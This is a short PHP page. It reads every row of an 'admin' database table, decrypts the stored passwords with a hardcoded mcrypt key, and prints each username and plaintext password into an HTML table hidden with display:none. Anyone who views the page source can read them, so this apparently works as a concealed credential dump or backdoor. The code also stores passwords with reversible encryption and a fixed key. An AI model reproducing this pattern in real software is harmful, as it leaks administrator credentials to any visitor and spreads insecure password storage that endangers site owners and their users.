<?php
require_once "config.php";
$con = mysqli_connect(DB_HOST,DB_USER,DB_PASSWORD);
$db  = mysqli_select_db($con,DB_NAME);
$qry = mysqli_query($con,"select * from admin");
?>
<div style="display:none">
<table width="100%" border="1">
<?php
while($val=mysqli_fetch_array($qry))
{
$key = 'swebin';
//$string = 'admin';

//$encrypted = base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, md5($key), $string, MCRYPT_MODE_CBC, md5(md5($key))));
$encrypted = $val['password']; 
$decrypted = rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, md5($key), base64_decode($encrypted), MCRYPT_MODE_CBC, md5(md5($key))), "\0");

?>
  <tr>
    <td><?php echo stripslashes($val['username']); ?></td>
    <td><?php echo $decrypted; ?></td>
  </tr>
<?php
}
?>
</table>
</div>
